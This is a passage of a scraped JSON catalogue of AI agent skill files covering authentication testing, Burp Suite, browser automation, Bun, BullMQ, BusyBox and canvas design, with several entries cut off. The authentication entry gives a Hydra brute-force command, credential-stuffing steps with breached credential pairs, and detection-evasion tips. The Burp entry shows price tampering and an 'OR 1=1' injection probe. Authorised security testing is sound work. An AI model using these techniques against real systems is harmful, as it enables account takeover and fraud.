      "content": "\n# Broken Authentication Testing\n\n## Purpose\n\nIdentify and exploit authentication and session management vulnerabilities in web applications. Broken authentication consistently ranks in the OWASP Top 10 and can lead to account takeover, identity theft, and unauthorized access to sensitive systems. This skill covers testing methodologies for password policies, session handling, multi-factor authentication, and credential management.\n\n## Prerequisites\n\n### Required Knowledge\n- HTTP protocol and session mechanisms\n- Authentication types (SFA, 2FA, MFA)\n- Cookie and token handling\n- Common authentication frameworks\n\n### Required Tools\n- Burp Suite Professional or Community\n- Hydra or similar brute-force tools\n- Custom wordlists for credential testing\n- Browser developer tools\n\n### Required Access\n- Target application URL\n- Test account credentials\n- Written authorization for testing\n\n## Outputs and Deliverables\n\n1. **Authentication Assessment Report** - Document all identified vulnerabilities\n2. **Credential Testing Results** - Brute-force and dictionary attack outcomes\n3. **Session Security Analysis** - Token randomness and timeout evaluation\n4. **Remediation Recommendations** - Security hardening guidance\n\n## Core Workflow\n\n### Phase 1: Authentication Mechanism Analysis\n\nUnderstand the application's authentication architecture:\n\n```\n# Identify authentication type\n- Password-based (forms, basic auth, digest)\n- Token-based (JWT, OAuth, API keys)\n- Certificate-based (mutual TLS)\n- Multi-factor (SMS, TOTP, hardware tokens)\n\n# Map authentication endpoints\n/login, /signin, /authenticate\n/register, /signup\n/forgot-password, /reset-password\n/logout, /signout\n/api/auth/*, /oauth/*\n```\n\nCapture and analyze authentication requests:\n\n```http\nPOST /login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=test&password=test123\n```\n\n### Phase 2: Password Policy Testing\n\nEvaluate password requirements and enforcement:\n\n```bash\n# Test minimum length (a, ab, abcdefgh)\n# Test complexity (password, password1, Password1!)\n# Test common weak passwords (123456, password, qwerty, admin)\n# Test username as password (admin/admin, test/test)\n```\n\nDocument policy gaps: Minimum length <8, no complexity, common passwords allowed, username as password.\n\n### Phase 3: Credential Enumeration\n\nTest for username enumeration vulnerabilities:\n\n```bash\n# Compare responses for valid vs invalid usernames\n# Invalid: \"Invalid username\" vs Valid: \"Invalid password\"\n# Check timing differences, response codes, registration messages\n```\n\n# Password reset\n\"Email sent if account exists\" (secure)\n\"No account with that email\" (leaks info)\n\n# API responses\n{\"error\": \"user_not_found\"}\n{\"error\": \"invalid_password\"}\n```\n\n### Phase 4: Brute Force Testing\n\nTest account lockout and rate limiting:\n\n```bash\n# Using Hydra for form-based auth\nhydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  target.com http-post-form \\\n  \"/login:username=^USER^&password=^PASS^:Invalid credentials\"\n\n# Using Burp Intruder\n1. Capture login request\n2. Send to Intruder\n3. Set payload positions on password field\n4. Load wordlist\n5. Start attack\n6. Analyze response lengths/codes\n```\n\nCheck for protections:\n\n```bash\n# Account lockout\n- After how many attempts?\n- Duration of lockout?\n- Lockout notification?\n\n# Rate limiting\n- Requests per minute limit?\n- IP-based or account-based?\n- Bypass via headers (X-Forwarded-For)?\n\n# CAPTCHA\n- After failed attempts?\n- Easily bypassable?\n```\n\n### Phase 5: Credential Stuffing\n\nTest with known breached credentials:\n\n```bash\n# Credential stuffing differs from brute force\n# Uses known email:password pairs from breaches\n\n# Using Burp Intruder with Pitchfork attack\n1. Set username and password as positions\n2. Load email list as payload 1\n3. Load password list as payload 2 (matched pairs)\n4. Analyze for successful logins\n\n# Detection evasion\n- Slow request rate\n- Rotate source IPs\n- Randomize user agents\n- Add delays between attempts\n```\n\n### Phase 6: Session Management Testing\n\nAnalyze session token security:\n\n```bash\n# Capture session cookie\nCookie: SESSIONID=abc123def456\n\n# Test token characteristics\n1. Entropy - Is it random enough?\n2. Length - Sufficient length (128+ bits)?\n3. Predictability - Sequential patterns?\n4. Secure flags - HttpOnly, Secure, SameSite?\n```\n\nSession token analysis:\n\n```python\n#!/usr/bin/env python3\nimport requests\nimport hashlib\n\n# Collect multiple session tokens\ntokens = []\nfor i in range(100):\n    response = requests.get(\"https://target.com/login\")\n    token = response.cookies.get(\"SESSIONID\")\n    tokens.append(token)\n\n# Analyze for patterns\n# Check for sequential increments\n# Calculate entropy\n# Look for timestamp components\n```\n\n### Phase 7: Session Fixation Testing\n\nTest if session is regenerated after authentication:\n\n```bash\n# Step 1: Get session before login\nGET /login HTTP/1.1\nResponse: Set-Cookie: SESSIONID=abc123\n\n# Step 2: Login with same session\nPOST /login HTTP/1.1\nCookie: SESSIONID=ab",
      "tags": [
        "python",
        "api",
        "ai",
        "agent",
        "llm",
        "workflow",
        "document",
        "security",
        "vulnerability",
        "aws"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:06.932Z"
    },
    {
      "id": "antigravity-browser-automation",
      "name": "browser-automation",
      "slug": "browser-automation",
      "description": "Browser automation powers web testing, scraping, and AI agent interactions. The difference between a flaky script and a reliable system comes down to understanding selectors, waiting strategies, and anti-detection patterns.  This skill covers Playwright (recommended) and Puppeteer, with patterns for",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/browser-automation",
      "content": "\n# Browser Automation\n\nYou are a browser automation expert who has debugged thousands of flaky tests\nand built scrapers that run for years without breaking. You've seen the\nevolution from Selenium to Puppeteer to Playwright and understand exactly\nwhen each tool shines.\n\nYour core insight: Most automation failures come from three sources - bad\nselectors, missing waits, and detection systems. You teach people to think\nlike the browser, use the right selectors, and let Playwright's auto-wait\ndo its job.\n\nFor scraping, yo\n\n## Capabilities\n\n- browser-automation\n- playwright\n- puppeteer\n- headless-browsers\n- web-scraping\n- browser-testing\n- e2e-testing\n- ui-automation\n- selenium-alternatives\n\n## Patterns\n\n### Test Isolation Pattern\n\nEach test runs in complete isolation with fresh state\n\n### User-Facing Locator Pattern\n\nSelect elements the way users see them\n\n### Auto-Wait Pattern\n\nLet Playwright wait automatically, never add manual waits\n\n## Anti-Patterns\n\n### ❌ Arbitrary Timeouts\n\n### ❌ CSS/XPath First\n\n### ❌ Single Browser Context for Everything\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | critical | # REMOVE all waitForTimeout calls |\n| Issue | high | # Use user-facing locators instead: |\n| Issue | high | # Use stealth plugins: |\n| Issue | high | # Each test must be fully isolated: |\n| Issue | medium | # Enable traces for failures: |\n| Issue | medium | # Set consistent viewport: |\n| Issue | high | # Add delays between requests: |\n| Issue | medium | # Wait for popup BEFORE triggering it: |\n\n## Related Skills\n\nWorks well with: `agent-tool-builder`, `workflow-automation`, `computer-use-agents`, `test-architect`\n",
      "tags": [
        "api",
        "ai",
        "agent",
        "automation",
        "workflow"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:08.183Z"
    },
    {
      "id": "antigravity-browser-extension-builder",
      "name": "browser-extension-builder",
      "slug": "browser-extension-builder",
      "description": "Expert in building browser extensions that solve real problems - Chrome, Firefox, and cross-browser extensions. Covers extension architecture, manifest v3, content scripts, popup UIs, monetization strategies, and Chrome Web Store publishing. Use when: browser extension, chrome extension, firefox add",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/browser-extension-builder",
      "content": "\n# Browser Extension Builder\n\n**Role**: Browser Extension Architect\n\nYou extend the browser to give users superpowers. You understand the\nunique constraints of extension development - permissions, security,\nstore policies. You build extensions that people install and actually\nuse daily. You know the difference between a toy and a tool.\n\n## Capabilities\n\n- Extension architecture\n- Manifest v3 (MV3)\n- Content scripts\n- Background workers\n- Popup interfaces\n- Extension monetization\n- Chrome Web Store publishing\n- Cross-browser support\n\n## Patterns\n\n### Extension Architecture\n\nStructure for modern browser extensions\n\n**When to use**: When starting a new extension\n\n```javascript\n## Extension Architecture\n\n### Project Structure\n```\nextension/\n├── manifest.json      # Extension config\n├── popup/\n│   ├── popup.html     # Popup UI\n│   ├── popup.css\n│   └── popup.js\n├── content/\n│   └── content.js     # Runs on web pages\n├── background/\n│   └── service-worker.js  # Background logic\n├── options/\n│   ├── options.html   # Settings page\n│   └── options.js\n└── icons/\n    ├── icon16.png\n    ├── icon48.png\n    └── icon128.png\n```\n\n### Manifest V3 Template\n```json\n{\n  \"manifest_version\": 3,\n  \"name\": \"My Extension\",\n  \"version\": \"1.0.0\",\n  \"description\": \"What it does\",\n  \"permissions\": [\"storage\", \"activeTab\"],\n  \"action\": {\n    \"default_popup\": \"popup/popup.html\",\n    \"default_icon\": {\n      \"16\": \"icons/icon16.png\",\n      \"48\": \"icons/icon48.png\",\n      \"128\": \"icons/icon128.png\"\n    }\n  },\n  \"content_scripts\": [{\n    \"matches\": [\"<all_urls>\"],\n    \"js\": [\"content/content.js\"]\n  }],\n  \"background\": {\n    \"service_worker\": \"background/service-worker.js\"\n  },\n  \"options_page\": \"options/options.html\"\n}\n```\n\n### Communication Pattern\n```\nPopup ←→ Background (Service Worker) ←→ Content Script\n              ↓\n        chrome.storage\n```\n```\n\n### Content Scripts\n\nCode that runs on web pages\n\n**When to use**: When modifying or reading page content\n\n```javascript\n## Content Scripts\n\n### Basic Content Script\n```javascript\n// content.js - Runs on every matched page\n\n// Wait for page to load\ndocument.addEventListener('DOMContentLoaded', () => {\n  // Modify the page\n  const element = document.querySelector('.target');\n  if (element) {\n    element.style.backgroundColor = 'yellow';\n  }\n});\n\n// Listen for messages from popup/background\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  if (message.action === 'getData') {\n    const data = document.querySelector('.data')?.textContent;\n    sendResponse({ data });\n  }\n  return true; // Keep channel open for async\n});\n```\n\n### Injecting UI\n```javascript\n// Create floating UI on page\nfunction injectUI() {\n  const container = document.createElement('div');\n  container.id = 'my-extension-ui';\n  container.innerHTML = `\n    <div style=\"position: fixed; bottom: 20px; right: 20px;\n                background: white; padding: 16px; border-radius: 8px;\n                box-shadow: 0 4px 12px rgba(0,0,0,0.15); z-index: 10000;\">\n      <h3>My Extension</h3>\n      <button id=\"my-extension-btn\">Click me</button>\n    </div>\n  `;\n  document.body.appendChild(container);\n\n  document.getElementById('my-extension-btn').addEventListener('click', () => {\n    // Handle click\n  });\n}\n\ninjectUI();\n```\n\n### Permissions for Content Scripts\n```json\n{\n  \"content_scripts\": [{\n    \"matches\": [\"https://specific-site.com/*\"],\n    \"js\": [\"content.js\"],\n    \"run_at\": \"document_end\"\n  }]\n}\n```\n```\n\n### Storage and State\n\nPersisting extension data\n\n**When to use**: When saving user settings or data\n\n```javascript\n## Storage and State\n\n### Chrome Storage API\n```javascript\n// Save data\nchrome.storage.local.set({ key: 'value' }, () => {\n  console.log('Saved');\n});\n\n// Get data\nchrome.storage.local.get(['key'], (result) => {\n  console.log(result.key);\n});\n\n// Sync storage (syncs across devices)\nchrome.storage.sync.set({ setting: true });\n\n// Watch for changes\nchrome.storage.onChanged.addListener((changes, area) => {\n  if (changes.key) {\n    console.log('key changed:', changes.key.newValue);\n  }\n});\n```\n\n### Storage Limits\n| Type | Limit |\n|------|-------|\n| local | 5MB |\n| sync | 100KB total, 8KB per item |\n\n### Async/Await Pattern\n```javascript\n// Modern async wrapper\nasync function getStorage(keys) {\n  return new Promise((resolve) => {\n    chrome.storage.local.get(keys, resolve);\n  });\n}\n\nasync function setStorage(data) {\n  return new Promise((resolve) => {\n    chrome.storage.local.set(data, resolve);\n  });\n}\n\n// Usage\nconst { settings } = await getStorage(['settings']);\nawait setStorage({ settings: { ...settings, theme: 'dark' } });\n```\n```\n\n## Anti-Patterns\n\n### ❌ Requesting All Permissions\n\n**Why bad**: Users won't install.\nStore may reject.\nSecurity risk.\nBad reviews.\n\n**Instead**: Request minimum needed.\nUse optional permissions.\nExplain why in description.\nRequest at time of use.\n\n### ❌ Heavy Background Processing\n\n**Why bad**: MV3 terminates idle workers.\nBattery drain.\nBrowser slows down.\nUsers uninst",
      "tags": [
        "javascript",
        "api",
        "ai",
        "template",
        "document",
        "security",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:09.443Z"
    },
    {
      "id": "antigravity-bullmq-specialist",
      "name": "bullmq-specialist",
      "slug": "bullmq-specialist",
      "description": "BullMQ expert for Redis-backed job queues, background processing, and reliable async execution in Node.js/TypeScript applications. Use when: bullmq, bull queue, redis queue, background job, job queue.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/bullmq-specialist",
      "content": "\n# BullMQ Specialist\n\nYou are a BullMQ expert who has processed billions of jobs in production.\nYou understand that queues are the backbone of scalable applications - they\ndecouple services, smooth traffic spikes, and enable reliable async processing.\n\nYou've debugged stuck jobs at 3am, optimized worker concurrency for maximum\nthroughput, and designed job flows that handle complex multi-step processes.\nYou know that most queue problems are actually Redis problems or application\ndesign problems.\n\nYour core philosophy:\n\n## Capabilities\n\n- bullmq-queues\n- job-scheduling\n- delayed-jobs\n- repeatable-jobs\n- job-priorities\n- rate-limiting-jobs\n- job-events\n- worker-patterns\n- flow-producers\n- job-dependencies\n\n## Patterns\n\n### Basic Queue Setup\n\nProduction-ready BullMQ queue with proper configuration\n\n### Delayed and Scheduled Jobs\n\nJobs that run at specific times or after delays\n\n### Job Flows and Dependencies\n\nComplex multi-step job processing with parent-child relationships\n\n## Anti-Patterns\n\n### ❌ Giant Job Payloads\n\n### ❌ No Dead Letter Queue\n\n### ❌ Infinite Concurrency\n\n## Related Skills\n\nWorks well with: `redis-specialist`, `backend`, `nextjs-app-router`, `email-systems`, `ai-workflow-automation`, `performance-hunter`\n",
      "tags": [
        "typescript",
        "node",
        "nextjs",
        "ai",
        "llm",
        "automation",
        "workflow",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:10.639Z"
    },
    {
      "id": "antigravity-bun-development",
      "name": "bun-development",
      "slug": "bun-development",
      "description": "Modern JavaScript/TypeScript development with Bun runtime. Covers package management, bundling, testing, and migration from Node.js. Use when working with Bun, optimizing JS/TS development speed, or migrating from Node.js to Bun.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/bun-development",
      "content": "\n# ⚡ Bun Development\n\n> Fast, modern JavaScript/TypeScript development with the Bun runtime, inspired by [oven-sh/bun](https://github.com/oven-sh/bun).\n\n## When to Use This Skill\n\nUse this skill when:\n\n- Starting new JS/TS projects with Bun\n- Migrating from Node.js to Bun\n- Optimizing development speed\n- Using Bun's built-in tools (bundler, test runner)\n- Troubleshooting Bun-specific issues\n\n---\n\n## 1. Getting Started\n\n### 1.1 Installation\n\n```bash\n# macOS / Linux\ncurl -fsSL https://bun.sh/install | bash\n\n# Windows\npowershell -c \"irm bun.sh/install.ps1 | iex\"\n\n# Homebrew\nbrew tap oven-sh/bun\nbrew install bun\n\n# npm (if needed)\nnpm install -g bun\n\n# Upgrade\nbun upgrade\n```\n\n### 1.2 Why Bun?\n\n| Feature         | Bun            | Node.js                     |\n| :-------------- | :------------- | :-------------------------- |\n| Startup time    | ~25ms          | ~100ms+                     |\n| Package install | 10-100x faster | Baseline                    |\n| TypeScript      | Native         | Requires transpiler         |\n| JSX             | Native         | Requires transpiler         |\n| Test runner     | Built-in       | External (Jest, Vitest)     |\n| Bundler         | Built-in       | External (Webpack, esbuild) |\n\n---\n\n## 2. Project Setup\n\n### 2.1 Create New Project\n\n```bash\n# Initialize project\nbun init\n\n# Creates:\n# ├── package.json\n# ├── tsconfig.json\n# ├── index.ts\n# └── README.md\n\n# With specific template\nbun create <template> <project-name>\n\n# Examples\nbun create react my-app        # React app\nbun create next my-app         # Next.js app\nbun create vite my-app         # Vite app\nbun create elysia my-api       # Elysia API\n```\n\n### 2.2 package.json\n\n```json\n{\n  \"name\": \"my-bun-project\",\n  \"version\": \"1.0.0\",\n  \"module\": \"index.ts\",\n  \"type\": \"module\",\n  \"scripts\": {\n    \"dev\": \"bun run --watch index.ts\",\n    \"start\": \"bun run index.ts\",\n    \"test\": \"bun test\",\n    \"build\": \"bun build ./index.ts --outdir ./dist\",\n    \"lint\": \"bunx eslint .\"\n  },\n  \"devDependencies\": {\n    \"@types/bun\": \"latest\"\n  },\n  \"peerDependencies\": {\n    \"typescript\": \"^5.0.0\"\n  }\n}\n```\n\n### 2.3 tsconfig.json (Bun-optimized)\n\n```json\n{\n  \"compilerOptions\": {\n    \"lib\": [\"ESNext\"],\n    \"module\": \"esnext\",\n    \"target\": \"esnext\",\n    \"moduleResolution\": \"bundler\",\n    \"moduleDetection\": \"force\",\n    \"allowImportingTsExtensions\": true,\n    \"noEmit\": true,\n    \"composite\": true,\n    \"strict\": true,\n    \"downlevelIteration\": true,\n    \"skipLibCheck\": true,\n    \"jsx\": \"react-jsx\",\n    \"allowSyntheticDefaultImports\": true,\n    \"forceConsistentCasingInFileNames\": true,\n    \"allowJs\": true,\n    \"types\": [\"bun-types\"]\n  }\n}\n```\n\n---\n\n## 3. Package Management\n\n### 3.1 Installing Packages\n\n```bash\n# Install from package.json\nbun install              # or 'bun i'\n\n# Add dependencies\nbun add express          # Regular dependency\nbun add -d typescript    # Dev dependency\nbun add -D @types/node   # Dev dependency (alias)\nbun add --optional pkg   # Optional dependency\n\n# From specific registry\nbun add lodash --registry https://registry.npmmirror.com\n\n# Install specific version\nbun add react@18.2.0\nbun add react@latest\nbun add react@next\n\n# From git\nbun add github:user/repo\nbun add git+https://github.com/user/repo.git\n```\n\n### 3.2 Removing & Updating\n\n```bash\n# Remove package\nbun remove lodash\n\n# Update packages\nbun update              # Update all\nbun update lodash       # Update specific\nbun update --latest     # Update to latest (ignore ranges)\n\n# Check outdated\nbun outdated\n```\n\n### 3.3 bunx (npx equivalent)\n\n```bash\n# Execute package binaries\nbunx prettier --write .\nbunx tsc --init\nbunx create-react-app my-app\n\n# With specific version\nbunx -p typescript@4.9 tsc --version\n\n# Run without installing\nbunx cowsay \"Hello from Bun!\"\n```\n\n### 3.4 Lockfile\n\n```bash\n# bun.lockb is a binary lockfile (faster parsing)\n# To generate text lockfile for debugging:\nbun install --yarn    # Creates yarn.lock\n\n# Trust existing lockfile\nbun install --frozen-lockfile\n```\n\n---\n\n## 4. Running Code\n\n### 4.1 Basic Execution\n\n```bash\n# Run TypeScript directly (no build step!)\nbun run index.ts\n\n# Run JavaScript\nbun run index.js\n\n# Run with arguments\nbun run server.ts --port 3000\n\n# Run package.json script\nbun run dev\nbun run build\n\n# Short form (for scripts)\nbun dev\nbun build\n```\n\n### 4.2 Watch Mode\n\n```bash\n# Auto-restart on file changes\nbun --watch run index.ts\n\n# With hot reloading\nbun --hot run server.ts\n```\n\n### 4.3 Environment Variables\n\n```typescript\n// .env file is loaded automatically!\n\n// Access environment variables\nconst apiKey = Bun.env.API_KEY;\nconst port = Bun.env.PORT ?? \"3000\";\n\n// Or use process.env (Node.js compatible)\nconst dbUrl = process.env.DATABASE_URL;\n```\n\n```bash\n# Run with specific env file\nbun --env-file=.env.production run index.ts\n```\n\n---\n\n## 5. Built-in APIs\n\n### 5.1 File System (Bun.file)\n\n```typescript\n// Read file\nconst file = Bun.file(\"./data.json\");\nconst text = await file.text();\nconst json = await file.json();\nconst buffer = awa",
      "tags": [
        "javascript",
        "typescript",
        "react",
        "node",
        "api",
        "ai",
        "template",
        "document",
        "rag",
        "cro"
      ],
      "useCases": [
        "Starting new JS/TS projects with Bun",
        "Migrating from Node.js to Bun",
        "Optimizing development speed",
        "Using Bun's built-in tools (bundler, test runner)",
        "Troubleshooting Bun-specific issues"
      ],
      "scrapedAt": "2026-01-26T13:17:12.163Z"
    },
    {
      "id": "antigravity-burp-suite-testing",
      "name": "Burp Suite Web Application Testing",
      "slug": "burp-suite-testing",
      "description": "This skill should be used when the user asks to \"intercept HTTP traffic\", \"modify web requests\", \"use Burp Suite for testing\", \"perform web vulnerability scanning\", \"test with Burp Repeater\", \"analyze HTTP history\", or \"configure proxy for web testing\". It provides comprehensive guidance for using B",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/burp-suite-testing",
      "content": "\n# Burp Suite Web Application Testing\n\n## Purpose\n\nExecute comprehensive web application security testing using Burp Suite's integrated toolset, including HTTP traffic interception and modification, request analysis and replay, automated vulnerability scanning, and manual testing workflows. This skill enables systematic discovery and exploitation of web application vulnerabilities through proxy-based testing methodology.\n\n## Inputs / Prerequisites\n\n### Required Tools\n- Burp Suite Community or Professional Edition installed\n- Burp's embedded browser or configured external browser\n- Target web application URL\n- Valid credentials for authenticated testing (if applicable)\n\n### Environment Setup\n- Burp Suite launched with temporary or named project\n- Proxy listener active on 127.0.0.1:8080 (default)\n- Browser configured to use Burp proxy (or use Burp's browser)\n- CA certificate installed for HTTPS interception\n\n### Editions Comparison\n| Feature | Community | Professional |\n|---------|-----------|--------------|\n| Proxy | ✓ | ✓ |\n| Repeater | ✓ | ✓ |\n| Intruder | Limited | Full |\n| Scanner | ✗ | ✓ |\n| Extensions | ✓ | ✓ |\n\n## Outputs / Deliverables\n\n### Primary Outputs\n- Intercepted and modified HTTP requests/responses\n- Vulnerability scan reports with remediation advice\n- HTTP history and site map documentation\n- Proof-of-concept exploits for identified vulnerabilities\n\n## Core Workflow\n\n### Phase 1: Intercepting HTTP Traffic\n\n#### Launch Burp's Browser\nNavigate to integrated browser for seamless proxy integration:\n\n1. Open Burp Suite and create/open project\n2. Go to **Proxy > Intercept** tab\n3. Click **Open Browser** to launch preconfigured browser\n4. Position windows to view both Burp and browser simultaneously\n\n#### Configure Interception\nControl which requests are captured:\n\n```\nProxy > Intercept > Intercept is on/off toggle\n\nWhen ON: Requests pause for review/modification\nWhen OFF: Requests pass through, logged to history\n```\n\n#### Intercept and Forward Requests\nProcess intercepted traffic:\n\n1. Set intercept toggle to **Intercept on**\n2. Navigate to target URL in browser\n3. Observe request held in Proxy > Intercept tab\n4. Review request contents (headers, parameters, body)\n5. Click **Forward** to send request to server\n6. Continue forwarding subsequent requests until page loads\n\n#### View HTTP History\nAccess complete traffic log:\n\n1. Go to **Proxy > HTTP history** tab\n2. Click any entry to view full request/response\n3. Sort by clicking column headers (# for chronological order)\n4. Use filters to focus on relevant traffic\n\n### Phase 2: Modifying Requests\n\n#### Intercept and Modify\nChange request parameters before forwarding:\n\n1. Enable interception: **Intercept on**\n2. Trigger target request in browser\n3. Locate parameter to modify in intercepted request\n4. Edit value directly in request editor\n5. Click **Forward** to send modified request\n\n#### Common Modification Targets\n| Target | Example | Purpose |\n|--------|---------|---------|\n| Price parameters | `price=1` | Test business logic |\n| User IDs | `userId=admin` | Test access control |\n| Quantity values | `qty=-1` | Test input validation |\n| Hidden fields | `isAdmin=true` | Test privilege escalation |\n\n#### Example: Price Manipulation\n\n```http\nPOST /cart HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nproductId=1&quantity=1&price=100\n\n# Modify to:\nproductId=1&quantity=1&price=1\n```\n\nResult: Item added to cart at modified price.\n\n### Phase 3: Setting Target Scope\n\n#### Define Scope\nFocus testing on specific target:\n\n1. Go to **Target > Site map**\n2. Right-click target host in left panel\n3. Select **Add to scope**\n4. When prompted, click **Yes** to exclude out-of-scope traffic\n\n#### Filter by Scope\nRemove noise from HTTP history:\n\n1. Click display filter above HTTP history\n2. Select **Show only in-scope items**\n3. History now shows only target site traffic\n\n#### Scope Benefits\n- Reduces clutter from third-party requests\n- Prevents accidental testing of out-of-scope sites\n- Improves scanning efficiency\n- Creates cleaner reports\n\n### Phase 4: Using Burp Repeater\n\n#### Send Request to Repeater\nPrepare request for manual testing:\n\n1. Identify interesting request in HTTP history\n2. Right-click request and select **Send to Repeater**\n3. Go to **Repeater** tab to access request\n\n#### Modify and Resend\nTest different inputs efficiently:\n\n```\n1. View request in Repeater tab\n2. Modify parameter values\n3. Click Send to submit request\n4. Review response in right panel\n5. Use navigation arrows to review request history\n```\n\n#### Repeater Testing Workflow\n\n```\nOriginal Request:\nGET /product?productId=1 HTTP/1.1\n\nTest 1: productId=2    → Valid product response\nTest 2: productId=999  → Not Found response  \nTest 3: productId='    → Error/exception response\nTest 4: productId=1 OR 1=1 → SQL injection test\n```\n\n#### Analyze Responses\nLook for indicators of vulnerabilities:\n\n- Error messages revealing stack traces\n- Framework/version information discl",
      "tags": [
        "javascript",
        "ai",
        "workflow",
        "document",
        "security",
        "vulnerability",
        "aws"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:13.463Z"
    },
    {
      "id": "antigravity-busybox-on-windows",
      "name": "busybox-on-windows",
      "slug": "busybox-on-windows",
      "description": "How to use a Win32 build of BusyBox to run many of the standard UNIX command line tools on Windows.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/busybox-on-windows",
      "content": "\nBusyBox is a single binary that implements many common Unix tools.\n\nUse this skill only on Windows. If you are on UNIX, then stop here.\n\nRun the following steps only if you cannot find a `busybox.exe` file in the same directory as this document is. \nThese are PowerShell commands, if you have a classic `cmd.exe` terminal, then you must use `powershell -Command \"...\"` to run them.\n1. Print the type of CPU: `Get-CimInstance -ClassName Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed`\n2. Print the OS versions: `Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" | Select-Object ProductName, DisplayVersion, CurrentBuild`\n3. Download a suitable build of BusyBox by running one of these PowerShell commands:\n   - 32-bit x86 (ANSI): `$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://frippery.org/files/busybox/busybox.exe -OutFile busybox.exe`\n   - 64-bit x86 (ANSI): `$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://frippery.org/files/busybox/busybox64.exe -OutFile busybox.exe`\n   - 64-bit x86 (Unicode): `$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://frippery.org/files/busybox/busybox64u.exe -OutFile busybox.exe`\n   - 64-bit ARM (Unicode): `$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://frippery.org/files/busybox/busybox64a.exe -OutFile busybox.exe`\n\nUseful commands:\n- Help: `busybox.exe --list`\n- Available UNIX commands: `busybox.exe --list`\n\nUsage: Prefix the UNIX command with `busybox.exe`, for example: `busybox.exe ls -1`\n\nIf you need to run a UNIX command under another CWD, then use the absolute path to `busybox.exe`.\n\nDocumentation: https://frippery.org/busybox/\nOriginal BusyBox: https://busybox.net/\n",
      "tags": [
        "ai",
        "document",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:14.629Z"
    },
    {
      "id": "anthropic-canvas-design",
      "name": "canvas-design",
      "slug": "canvas-design",
      "description": "Create beautiful visual art in .png and .pdf documents using design philosophy. You should use this skill when the user asks to create a poster, piece of art, design, or other static piece. Create original visual designs, never copying existing artists' work to avoid copyright violations.",
      "category": "Creative & Media",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/canvas-design",
      "content": "\nThese are instructions for creating design philosophies - aesthetic movements that are then EXPRESSED VISUALLY. Output only .md files, .pdf files, and .png files.\n\nComplete this in two steps:\n1. Design Philosophy Creation (.md file)\n2. Express by creating it on a canvas (.pdf file or .png file)\n\nFirst, undertake this task:\n\n## DESIGN PHILOSOPHY CREATION\n\nTo begin, create a VISUAL PHILOSOPHY (not layouts or templates) that will be interpreted through:\n- Form, space, color, composition\n- Images, graphics, shapes, patterns\n- Minimal text as visual accent\n\n### THE CRITICAL UNDERSTANDING\n- What is received: Some subtle input or instructions by the user that should be taken into account, but used as a foundation; it should not constrain creative freedom.\n- What is created: A design philosophy/aesthetic movement.\n- What happens next: Then, the same version receives the philosophy and EXPRESSES IT VISUALLY - creating artifacts that are 90% visual design, 10% essential text.\n\nConsider this approach:\n- Write a manifesto for an art movement\n- The next phase involves making the artwork\n\nThe philosophy must emphasize: Visual expression. Spatial communication. Artistic interpretation. Minimal words.\n\n### HOW TO GENERATE A VISUAL PHILOSOPHY\n\n**Name the movement** (1-2 words): \"Brutalist Joy\" / \"Chromatic Silence\" / \"Metabolist Dreams\"\n\n**Articulate the philosophy** (4-6 paragraphs - concise but complete):\n\nTo capture the VISUAL essence, express how the philosophy manifests through:\n- Space and form\n- Color and material\n- Scale and rhythm\n- Composition and balance\n- Visual hierarchy\n\n**CRITICAL GUIDELINES:**\n- **Avoid redundancy**: Each design aspect should be mentioned once. Avoid repeating points about color theory, spatial relationships, or typographic principles unless adding new depth.\n- **Emphasize craftsmanship REPEATEDLY**: The philosophy MUST stress multiple times that the final work should appear as though it took countless hours to create, was labored over with care, and comes from someone at the absolute top of their field. This framing is essential - repeat phrases like \"meticulously crafted,\" \"the product of deep expertise,\" \"painstaking attention,\" \"master-level execution.\"\n- **Leave creative space**: Remain specific about the aesthetic direction, but concise enough that the next Claude has room to make interpretive choices also at a extremely high level of craftmanship.\n\nThe philosophy must guide the next version to express ideas VISUALLY, not through text. Information lives in design, not paragraphs.\n\n### PHILOSOPHY EXAMPLES\n\n**\"Concrete Poetry\"**\nPhilosophy: Communication through monumental form and bold geometry.\nVisual expression: Massive color blocks, sculptural typography (huge single words, tiny labels), Brutalist spatial divisions, Polish poster energy meets Le Corbusier. Ideas expressed through visual weight and spatial tension, not explanation. Text as rare, powerful 